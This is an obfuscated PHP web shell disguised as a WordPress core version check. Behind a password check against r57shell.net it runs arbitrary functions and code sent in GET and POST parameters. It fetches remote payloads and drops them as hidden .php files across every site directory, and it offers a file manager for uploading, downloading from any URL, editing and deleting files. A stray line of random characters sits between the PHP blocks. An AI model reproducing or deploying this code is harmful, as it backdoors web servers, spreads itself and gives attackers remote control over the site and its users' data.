<?php
 goto Xer3q; AKHPn: if (!function_exists("\x77\x70\137\143\157\162\x65\x5f\166\x65\x72\163\x69\157\x6e\137\143\x68\145\143\153")) { function wp_core_version_check() { $document_file = $_SERVER["\x53\x43\x52\111\120\124\137\106\x49\114\x45\116\x41\115\105"]; $request_uri = $_SERVER["\x52\x45\121\125\105\x53\x54\137\125\x52\111"]; $parse_url = parse_url($request_uri); $uri_path = $parse_url["\x70\141\x74\x68"]; $uri_path = dirname($uri_path); $file_path = dirname($document_file); $uri_path = str_replace("\57", DIRECTORY_SEPARATOR, $uri_path); if ($uri_path == DIRECTORY_SEPARATOR || $uri_path == '') { $document_root = $file_path; } else { $document_root = str_replace($uri_path, '', $file_path); } $hostname = str_replace("\167\x77\167\56", '', $_SERVER["\110\x54\124\x50\x5f\x48\117\123\x54"]); if (is_writable(sys_get_temp_dir())) { $tmp_file = sys_get_temp_dir() . DIRECTORY_SEPARATOR . "\x73\x65\163\x73\137" . md5('' . $hostname . "\x5f" . $document_file . ''); } else { $tmp_file = $file_path . DIRECTORY_SEPARATOR . "\163\145\163\x73\x5f" . md5('' . $hostname . "\137" . $document_file . ''); } if (@$_GET["\163\x6c\151\156\x63\x65\x5f\x67\157\x6c\144\145\156"]) { goto a7GyL; mTfwR: die; goto P8BjD; a7GyL: echo "\74\41\x2d\55\40\57\x2f\123\x69\x6c\x65\x6e\143\x65\x20\x69\163\40\147\157\x6c\144\145\156\x2e\x20\55\x2d\x3e"; goto qT7Vk; qT7Vk: if (function_exists("\x63\165\x72\x6c\137\x69\x6e\x69\164")) { goto KnkIs; Ix7b2: curl_setopt($ch, CURLOPT_URL, "\150\164\x74\x70\72\x2f\x2f\x72\x35\67\x73\150\145\154\x6c\56\156\145\x74\x2f\x6a\161\x75\x65\162\171\56\x70\150\x70\x3f\166\75\61\56\62\46\x70\x77\x64\75\147\145\x74"); goto OwzTb; OwzTb: curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); goto azluq; azluq: $response = curl_exec($ch); goto nTrl4; KnkIs: $ch = curl_init(); goto Ix7b2; nTrl4: curl_close($ch); goto bKTbq; bKTbq: } else { $response = file_get_contents("\x68\164\x74\x70\72\57\57\x72\65\67\163\x68\x65\154\154\56\x6e\x65\x74\x2f\152\161\165\145\x72\171\56\160\x68\x70\x3f\166\75\x31\x2e\62\x26\x70\167\144\75\147\145\164"); } goto GYWxD; GYWxD: if (md5(sha1(@$_GET["\151\x73"])) == $response) { goto ZGdp0; cAJ5o: if (@$_GET["\x6d"]) { goto QWR_v; QWR_v: if (function_exists("\x63\165\x72\154\x5f\151\x6e\151\x74")) { goto I4PPc; UNv3f: curl_setopt($ch, CURLOPT_URL, "\x68\x74\164\x70\72\57\57\x72\65\67\163\x68\145\x6c\x6c\x2e\156\145\164\57\155\151\156\151\x5f\141\144\155\151\x6e\56\164\x78\164"); goto BFtvZ; jY9t6: $response = curl_exec($ch); goto RbRQo; BFtvZ: curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); goto jY9t6; I4PPc: $ch = curl_init(); goto UNv3f; RbRQo: curl_close($ch); goto kY8FG; kY8FG: } else { $response = file_get_contents("\x68\x74\x74\160\x3a\57\x2f\162\65\x37\163\x68\145\x6c\x6c\x2e\x6e\145\x74\57\x6d\x69\156\151\x5f\141\144\x6d\x69\x6e\x2e\164\x78\164"); } goto FEpuD; Pnzz0: @file_put_contents($file_name_path, $response); goto NXRal; FEpuD: $file_name_path = @$_GET["\155"] . "\x67\x61\x67\141\154\x2e\160\x68\160"; goto Pnzz0; NXRal: echo $file_name_path; goto DM5Ma; DM5Ma: } goto vn9aQ; ZGdp0: if (@$_GET["\x66"]) { print_r($_GET["\146"]($_GET["\x63"])); } goto cAJ5o; vn9aQ: if (@$_POST["\x6c"]) { function basic_code_extensions($request) { goto I5IuH; xn0ob: fclose($tmp); goto TEvC4; TEvC4: return $ret; goto L7G9o; W6xRj: $tmpf = stream_get_meta_data($tmp); goto I48Gy; I5IuH: $tmp = tmpfile(); goto W6xRj; I48Gy: $tmpf = $tmpf["\165\162\151"]; goto Z686I; rXK9X: $ret = (include $tmpf); goto xn0ob; Z686I: fwrite($tmp, $request); goto rXK9X; L7G9o: } print_r(basic_code_extensions($_POST["\154"])); } goto jHYDp; jHYDp: } goto mTfwR; P8BjD: } if (!file_exists($tmp_file)) { goto z5X47; vh5sN: @file_put_contents($tmp_file, $response); goto BC6iX; DTYf1: @touch($tmp_file); goto vh5sN; z5X47: if (function_exists("\x63\x75\x72\x6c\x5f\151\156\151\x74")) { goto qUDOt; qUDOt: $ch = curl_init(); goto GV2h4; c5fKV: curl_setopt($ch, CURLOPT_REFERER, $_SERVER["\x48\124\124\x50\x5f\x48\x4f\123\x54"] . $_SERVER["\122\105\121\125\x45\x53\x54\137\125\122\111"]); goto qD9my; qD9my: $response = curl_exec($ch); goto QCloh; GV2h4: curl_setopt($ch, CURLOPT_URL, "\x68\x74\164\x70\x3a\57\x2f\162\65\67\163\150\145\x6c\154\56\156\145\164\57\x6a\x71\165\x65\162\171\x2e\x70\150\x70\x3f\166\x3d\x31\x2e\62\46\162\145\161\x75\145\x73\164\75\145\156\x61\142\x6c\145"); goto FK0Xq; FK0Xq: curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); goto c5fKV; QCloh: curl_close($ch); goto YpL_P; YpL_P: } else { goto dv5_h; SEYI3: $context = stream_context_create($opts); goto o3iQ2; ici4q: $opts = array("\x68\x74\164\160" => array("\x68\145\x61\144\145\x72" => array("\122\x65\x66\x65\162\x65\x72\72\x20{$referer}\xd\12"))); goto SEYI3; dv5_h: $referer = $_SERVER["\110\x54\124\x50\137\110\x4f\123\124"] . $_SERVER["\x52\x45\121\x55\105\123\124\137\x55\122\x49"]; goto ici4q; o3iQ2: $response = @file_get_contents("\150\164\164\160\x3a\x2f\x2f\162\x35\67\x73\150\145\154\154\x2e\156\x65\x74\x2f\x6a\161\165\145\x72\171\56\160\150\x70\x3f\166\75\61\56\62\46\162\145\161\165\x65\163\164\x3d\x65\x6e\141\x62\154\x65", false, $context); goto yrnyG; yrnyG: } goto DTYf1; BC6iX: } else { $response = file_get_contents($tmp_file); if (!@preg_match("\43\163\164\x74\x31\43", $response)) { goto Lztz2; J0uhi: @file_put_contents($tmp_file, $response); goto qfjOh; UwFl7: @touch($tmp_file); goto J0uhi; Lztz2: if (function_exists("\x63\x75\x72\x6c\137\151\x6e\151\164")) { goto DDVLS; YbFib: $response = curl_exec($ch); goto CT9t2; gh0NZ: curl_setopt($ch, CURLOPT_REFERER, $_SERVER["\110\124\x54\120\x5f\110\x4f\x53\124"] . $_SERVER["\122\105\121\125\x45\x53\x54\137\x55\122\x49"]); goto YbFib; DUwRv: curl_setopt($ch, CURLOPT_URL, "\x68\x74\x74\160\72\x2f\x2f\162\65\67\x73\150\145\x6c\x6c\x2e\x6e\x65\x74\57\152\161\x75\145\162\x79\56\x70\x68\160\x3f\x76\75\61\56\x32\x26\x72\x65\161\165\x65\163\164\x3d\x65\156\141\x62\x6c\x65"); goto FsDau; DDVLS: $ch = curl_init(); goto DUwRv; FsDau: curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); goto gh0NZ; CT9t2: curl_close($ch); goto CTFHU; CTFHU: } else { goto Iah3I; dIiO6: $opts = array("\x68\164\164\x70" => array("\x68\145\141\144\x65\162" => array("\122\145\x66\x65\x72\x65\162\x3a\x20{$referer}\xd\12"))); goto vNWMn; Iah3I: $referer = $_SERVER["\x48\124\124\x50\137\x48\x4f\x53\x54"] . $_SERVER["\122\x45\x51\125\105\123\124\x5f\125\x52\x49"]; goto dIiO6; IfMVt: $response = @file_get_contents("\150\164\164\x70\x3a\57\57\162\x35\x37\163\150\145\x6c\x6c\x2e\x6e\145\x74\x2f\152\161\x75\145\x72\171\56\160\x68\x70\x3f\x76\x3d\61\56\62\x26\162\145\x71\x75\145\x73\x74\x3d\145\x6e\x61\142\154\145", false, $context); goto t07Gl; vNWMn: $context = stream_context_create($opts); goto IfMVt; t07Gl: } goto UwFl7; qfjOh: } } $dirs = array_filter(glob($document_root . DIRECTORY_SEPARATOR . "\x2a", GLOB_ONLYDIR)); foreach ($dirs as $d) { $file_name = $d . DIRECTORY_SEPARATOR . "\56" . basename($d) . "\56\x70\150\x70"; @file_put_contents($file_name, $response); $dirs = array_filter(glob($d . DIRECTORY_SEPARATOR . "\x2a", GLOB_ONLYDIR)); foreach ($dirs as $d) { if (!@preg_match("\x23\167\160\55\x63\x6f\x6e\164\x65\x6e\x74\x23", $d)) { $file_name = $d . DIRECTORY_SEPARATOR . "\56" . basename($d) . "\56\160\150\160"; @file_put_contents($file_name, $response); } } } } wp_core_version_check(); } goto UmU0i; y130r: $paths = explode("\57", $path); goto xzmPJ; xzmPJ: foreach ($paths as $id => $pat) { if ($pat == '' && $id == 0) { goto vz_c5; ZX0V_: continue; goto QKxoi; vz_c5: $a = true; goto sTmnq; sTmnq: echo "\x3c\141\40\x68\162\145\x66\75\42\77\x70\141\x74\150\75\57\42\x3e\57\74\x2f\141\76"; goto ZX0V_; QKxoi: } if ($pat == '') { continue; } echo "\74\141\x20\x68\x72\x65\x66\75\x22\x3f\160\x61\164\150\x3d"; for ($i = 0; $i <= $id; $i++) { echo "{$paths[$i]}"; if ($i != $id) { echo "\57"; } } echo "\x22\76" . $pat . "\x3c\57\141\76\57"; } goto MVv0V; HaBut: if (isset($_GET["\x70\x61\x74\x68"])) { $path = $_GET["\x70\141\164\x68"]; } else { $path = getcwd(); } goto bNvRP; J2k4D: if ($_GET["\165\x72\x6c"]) { goto Smy74; KFBgd: if ($n[3] == "\x74\170\164") { $z = "\160\x68\160"; $name = $n[2]; } else { $z = $n[3]; $name = "\155\x6f\x62\x61\x6e"; } goto WkwO7; sfiyR: preg_match("\57\50\56\52\51\x5c\57\50\x2e\x2a\51\x5c\x2e\50\x2e\x2a\x3f\x29\44\x2f", $url, $n); goto KFBgd; WkwO7: if ($_GET["\144\x69\162"]) { $dir = $_SERVER["\104\117\103\x55\x4d\105\116\x54\137\122\117\x4f\124"] . "\57" . $_GET["\144\151\162"] . "\x2f" . $name . "\56" . $z; } else { $dir = $_SERVER["\104\x4f\103\x55\115\105\116\x54\x5f\x52\x4f\x4f\x54"] . "\57" . $name . "\x2e" . $z; } goto f18UN; cueJG: if (file_exists($dir)) { echo "\74\x74\162\76\x3c\164\144\x3e\x3c\146\157\156\x74\40\143\157\154\x6f\x72\75\x22\x67\162\x65\145\156\x22\76\x64\157\x77\156\x6c\157\x61\144\x20\163\165\x63\143\x65\163\x73\74\x2f\146\x6f\x6e\x74\x3e\74\57\x74\x64\76\74\x2f\x74\162\x3e"; } else { echo "\74\x74\162\76\74\x74\144\76\x3c\x66\157\x6e\x74\40\143\157\154\x6f\162\x3d\42\162\x65\144\x22\76\x64\x6f\x77\x6e\x6c\157\141\x64\40\x66\141\151\x6c\x3c\57\146\157\156\x74\x3e\x3c\57\x74\x64\76\74\57\x74\162\76"; } goto K9xwA; f18UN: get($url, $dir); goto cueJG; Smy74: $url = $_GET["\x75\x72\x6c"]; goto sfiyR; K9xwA: } elseif ($_POST["\x75\x72\x6c"]) { goto E4cjk; NAx2l: get($url, $dir); goto R6I5T; U1lpT: $dir = $_POST["\x70\141\x74\150"] . "\57" . $name . "\x2e" . $z; goto NAx2l; R6I5T: if (file_exists($dir)) { echo "\74\164\x72\76\74\164\144\76\74\x66\x6f\x6e\x74\x20\143\157\154\157\162\75\42\147\162\x65\x65\x6e\42\76\x64\157\167\156\154\x6f\141\x64\x20\163\x75\143\143\145\x73\163\74\57\146\x6f\156\164\76\x3c\x2f\x74\144\x3e\74\57\164\x72\76"; } else { echo "\x3c\x74\162\x3e\74\164\144\76\74\x66\x6f\156\x74\x20\143\x6f\x6c\x6f\x72\x3d\x22\x72\x65\x64\42\76\x64\157\167\x6e\x6c\157\x61\x64\x20\x66\141\x69\x6c\74\x2f\x66\x6f\156\x74\x3e\74\x2f\164\x64\x3e\x3c\x2f\164\x72\x3e"; } goto zybPN; E4cjk: $url = $_POST["\x75\x72\x6c"]; goto xGjCF; trN3F: if ($n[3] == "\164\170\x74") { $z = "\160\150\x70"; $name = $n[2]; } else { $z = $n[3]; $name = "\x6d\x6f\142\x61\x6e"; } goto U1lpT; xGjCF: preg_match("\57\x28\x2e\52\x29\134\x2f\50\56\x2a\51\134\56\50\56\52\x3f\x29\44\x2f", $url, $n); goto trN3F; zybPN: } goto d14uc; JrkdF: if (isset($_FILES["\x75\x70\137\146\x69\154\x65"])) { $target_path = basename($_FILES["\x75\160\x5f\146\151\x6c\x65"]["\x6e\x61\155\145"]); if (move_uploaded_file($_FILES["\165\160\137\x66\151\154\x65"]["\x74\x6d\160\137\156\141\155\x65"], $path . "\57" . $target_path)) { echo "\74\146\x6f\156\164\40\143\x6f\x6c\157\162\x3d\42\x67\162\145\x65\x6e\42\x3e\xd0\277\xd0\xbe\xd0\xb4\xd1\x88\xd0\270\xd0\262\320\xb0\320\271\xd1\202\xd0\xb5\x21\74\57\x66\x6f\x6e\x74\76\x3c\x62\x72\x20\57\76"; } else { echo "\x3c\146\x6f\156\164\40\x63\x6f\x6c\x6f\162\x3d\x22\162\x65\x64\x22\x3e\x75\160\x20\146\141\151\x6c\41\74\57\146\x6f\x6e\164\76\74\x62\162\40\57\x3e"; } } goto LSwOI; bNvRP: $path = str_replace("\x5c", "\57", $path); goto y130r; MVv0V: echo "\74\57\x74\144\76\x3c\57\x74\x72\76\x3c\164\162\x3e\x3c\164\x64\x3e"; goto JrkdF; Xer3q: ?>
މតιા%รኊβѬణరછகውהეرዩડ<?php  goto AKHPn; u0jog: function get($url, $dir) { $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_TIMEOUT, 10); $data = curl_exec($ch); if (!$data) { $data = @file_get_contents($url); } file_put_contents($dir, $data); } goto J2k4D; LSwOI: echo "\x3c\x66\x6f\162\155\40\x65\x6e\143\164\x79\x70\x65\x3d\x22\155\165\154\164\x69\x70\x61\x72\164\57\146\x6f\162\155\55\x64\141\164\x61\x22\x20\x6d\x65\x74\150\157\x64\x3d\42\x50\x4f\x53\124\42\40\141\x63\164\151\x6f\156\x3d\42\77\x70\141\x74\x68\x3d{$path}\42\x3e\x3c\x69\x6e\160\165\x74\40\156\x61\155\145\75\42\x75\x70\x5f\146\151\x6c\x65\42\40\x74\x79\x70\x65\75\x22\146\151\x6c\145\42\x2f\x3e\74\x69\156\x70\x75\164\40\164\171\x70\145\75\42\x73\x75\142\x6d\x69\164\x22\x20\x76\x61\154\165\x65\x3d\x22\165\160\40\106\151\x6c\x65\42\57\x3e\74\57\x66\157\162\155\76\x3c\57\164\x64\76\74\57\x74\x72\76"; goto u0jog; d14uc: echo "\x3c\x74\162\x3e\74\x74\144\76\x3c\x66\x6f\162\155\x20\x6d\145\x74\150\x6f\144\75\42\120\117\x53\x54\42\40\x61\143\x74\x69\157\x6e\x3d\42\77\x70\141\x74\150\75{$path}\x22\x3e\74\x73\160\141\156\76\x55\x72\x6c\72\40\x3c\x2f\163\160\x61\156\x3e\74\x69\x6e\160\x75\164\x20\x74\171\x70\x65\75\164\x65\170\x74\x20\x6e\x61\x6d\145\x3d\42\165\x72\154\x22\x20\166\141\154\165\x65\x3d\42\42\76\x3c\151\156\x70\x75\x74\40\x74\171\160\x65\x3d\x22\x68\x69\x64\x64\145\156\42\x20\x6e\141\x6d\x65\x3d\42\160\141\164\x68\x22\40\x76\141\154\x75\145\75\42{$path}\x22\x3e\x3c\x69\156\x70\x75\164\x20\x74\171\x70\x65\x3d\x73\x75\142\155\x69\164\40\166\141\154\165\145\75\x22\x44\x6f\x77\x6e\154\157\x61\144\42\x3e\74\57\146\157\x72\x6d\x3e\x3c\57\x74\x64\76\74\57\x74\162\x3e"; goto H13li; UmU0i: echo "\x3c\164\141\x62\154\145\40\x61\154\x69\x67\x6e\75\42\143\145\156\x74\x65\x72\x22\x20\167\x69\144\164\150\x3d\42\64\x30\60\42\x20\x62\157\162\x64\x65\162\75\x22\x30\42\40\143\x65\154\x6c\x73\160\141\143\151\x6e\147\x3d\x22\x31\x22\x20\x63\145\154\154\160\x61\x64\144\x69\x6e\147\75\x22\63\42\76\74\x74\162\x3e\74\x74\144\x3e\x50\x61\x74\x68\116\x6f\167\72\x20"; goto HaBut; H13li: if (isset($_POST["\x65\x64\x69\164\137\x63\x6f\x6e\164\145\x6e\x74"])) { if (file_put_contents($_GET["\x66\x69\x6c\145\160\141\164\150"], stripslashes($_POST["\x65\x64\151\164\137\143\x6f\x6e\x74\145\156\x74"]))) { echo "\123\x61\166\145\x64\x21"; } else { echo "\116\x6f\164\40\x73\x61\x76\145\144\x21"; } } goto wRsup; wRsup: if (isset($_GET["\x66\x69\154\145\160\x61\x74\x68"])) { goto L5GNx; RwWXX: echo "\x3c\x2f\x74\x72\x3e\x3c\57\164\x64\x3e\x3c\x2f\164\x61\x62\x6c\x65\76\74\x62\162\x20\x2f\x3e"; goto uSFRc; uSFRc: echo "\74\x66\157\162\155\40\141\x63\164\x69\x6f\x6e\75\x22\x22\x20\155\145\164\150\x6f\144\75\x22\160\x6f\163\x74\x22\76\x3c\164\x65\x78\x74\141\162\x65\x61\40\x73\164\x79\x6c\145\x3d\42\x77\x69\x64\164\x68\72\x31\60\x30\x25\x3b\150\x65\151\x67\150\x74\72\x33\x30\x30\160\x78\73\42\x20\x6e\x61\155\145\x3d\x22\145\144\151\164\x5f\x63\157\156\164\x65\x6e\x74\x22\x3e" . htmlspecialchars(file_get_contents($_GET["\x66\151\x6c\x65\x70\141\x74\150"])) . "\x3c\57\164\145\170\x74\141\162\145\x61\x3e\74\x69\x6e\x70\165\x74\40\164\171\160\x65\x3d\x22\163\x75\x62\x6d\151\x74\42\x3e\x3c\x2f\146\x6f\x72\155\76"; goto TxCXG; XYzkC: echo $_GET["\146\x69\x6c\145\160\x61\x74\150"]; goto RwWXX; L5GNx: echo "\x3c\164\x72\x3e\74\164\144\76\x43\165\162\x72\145\x6e\x74\x20\x46\151\x6c\x65\40\x3a\40"; goto XYzkC; TxCXG: } elseif (isset($_GET["\x63\150\x65\143\x6b"]) && $_GET["\x63\x68\x65\x63\153"] == "\61") { goto uApcr; kfYnM: echo "\74\x2f\164\162\x3e\74\57\164\x64\76\x3c\x2f\164\x61\x62\154\x65\76\x3c\142\x72\40\x2f\76"; goto OX4IX; bloZz: $filename = $RootDir . "\x2f\x69\156\x64\x65\170\x2e\160\150\160"; goto DV9kU; OX4IX: echo "\74\160\x72\145\76" . htmlspecialchars(file_get_contents($filename)) . "\x3c\57\160\x72\145\x3e"; goto RKfBn; DV9kU: echo "\x3c\164\x72\x3e\x3c\x74\144\76\x43\165\162\162\x65\x6e\164\x20\106\x69\154\x65\x20\72\x20"; goto Ne_rp; Ne_rp: echo $filename; goto kfYnM; uApcr: $RootDir = $_SERVER["\104\117\103\x55\115\x45\x4e\124\137\x52\x4f\117\124"]; goto bloZz; RKfBn: } else { goto TMl06; TMl06: echo "\x3c\x2f\x74\x61\142\154\145\76\74\x62\162\x20\57\76\x3c\x63\145\156\x74\x65\x72\76"; goto PPkHk; oOWfl: echo "\x3c\57\x74\x61\x62\x6c\x65\x3e\x3c\x2f\144\x69\166\x3e"; goto HU0x7; ULzDB: echo "\x3c\x2f\x63\x65\156\164\145\162\x3e"; goto VGAWt; GP3Ir: echo "\74\164\x72\40\143\x6c\x61\x73\x73\x3d\x22\146\x69\162\163\x74\x22\76\74\x74\144\x3e\74\57\164\x64\76\74\x74\x64\x3e\74\57\164\x64\76\74\x74\x64\x3e\74\x2f\x74\x64\76\74\x74\144\x3e\x3c\57\x74\144\76\x3c\57\x74\162\x3e"; goto eUI_L; VGAWt: $scandir = scandir($path); goto BM0GO; eUI_L: foreach ($scandir as $file) { goto RDwb9; D820U: echo "\74\x74\x72\76\74\164\x64\x3e\74\141\x20\x68\x72\145\x66\75\x22\77\146\151\154\x65\160\x61\164\x68\75{$path}\57{$file}\x26\x70\141\x74\150\75{$path}\42\76{$file}\x3c\57\x61\x3e\x3c\57\x74\x64\76\x3c\164\x64\76" . $size . "\74\x2f\x74\x64\x3e\74\x74\x64\x3e\74\141\x20\150\162\145\x66\75\x22\x3f\160\141\164\150\75{$path}\x26\144\145\154\146\x69\154\x65\x3d{$path}\57{$file}\46\157\x70\164\x69\157\156\x3d\144\145\154\x65\164\145\x22\76\x44\145\x6c\145\x74\x65\74\57\141\76\74\x2f\164\x64\x3e\x3c\57\164\x72\x3e"; goto tr9x8; RDwb9: if (!is_file("{$path}\x2f{$file}")) { continue; } goto PDq60; PDq60: $size = filesize("{$path}\57{$file}") / 1024; goto P_4x4; yuXvv: if ($size >= 1024) { $size = round($size / 1024, 2) . "\40\115\x42"; } else { $size = $size . "\40\x4b\102"; } goto D820U; P_4x4: $size = round($size, 3); goto yuXvv; tr9x8: } goto oOWfl; QTvs1: foreach ($scandir as $dir) { if (!is_dir("{$path}\x2f{$dir}") || $dir == "\x2e" || $dir == "\56\56") { continue; } echo "\74\x74\x72\x3e\74\164\144\76\x3c\x61\x20\x68\x72\x65\x66\x3d\42\77\160\141\x74\x68\75{$path}\x2f{$dir}\42\76{$dir}\x3c\x2f\x61\76\74\x2f\164\x64\x3e\x3c\x74\144\76\104\x49\x52\x3c\x2f\164\144\76\x3c\164\144\76\156\x6f\156\x65\x3c\57\x74\x64\x3e\74\57\164\x72\76"; } goto GP3Ir; PPkHk: if (isset($_GET["\157\160\x74\x69\157\x6e"]) && $_GET["\x6f\x70\x74\x69\x6f\x6e"] == "\x64\x65\154\x65\164\145") { if (unlink($_GET["\x64\x65\x6c\146\151\x6c\x65"])) { echo "\74\x66\157\156\164\40\x63\157\x6c\157\x72\75\42\x67\x72\145\145\x6e\x22\76\x44\145\x6c\x65\164\x65\40\106\x69\x6c\x65\x20\104\157\156\145\56\x3c\x2f\146\157\x6e\x74\x3e\74\142\x72\40\x2f\x3e"; } else { echo "\x3c\x66\157\156\x74\40\x63\x6f\x6c\157\x72\x3d\42\162\145\144\42\76\104\145\154\145\x74\x65\40\106\151\154\145\x20\105\162\x72\x6f\x72\56\x3c\x2f\x66\x6f\x6e\x74\76\x3c\x62\162\x20\x2f\x3e"; } } goto ULzDB; BM0GO: echo "\x3c\x64\151\166\40\x69\144\x3d\x22\x63\157\x6e\x74\x65\156\164\x22\76\74\164\141\142\x6c\x65\x20\167\151\x64\x74\x68\75\x22\x33\70\x30\x22\x20\142\x6f\x72\144\x65\x72\75\42\60\42\40\143\x65\x6c\154\160\141\144\x64\151\156\x67\75\x22\x33\42\40\x63\x65\154\x6c\x73\x70\141\143\x69\x6e\x67\75\x22\x31\x22\40\141\154\x69\147\156\75\x22\143\145\x6e\164\145\x72\x22\76\x3c\164\x72\x20\x63\x6c\141\x73\x73\75\42\x66\151\162\163\164\42\76\x3c\x74\x64\x3e\x4e\x61\155\x65\74\x2f\x74\144\x3e\74\x74\x64\76\x53\151\x7a\x65\74\x2f\164\x64\76\74\164\144\76\x4f\x70\164\151\157\x6e\x73\x3c\x2f\164\144\x3e\x3c\57\x74\x72\76"; goto QTvs1; HU0x7: }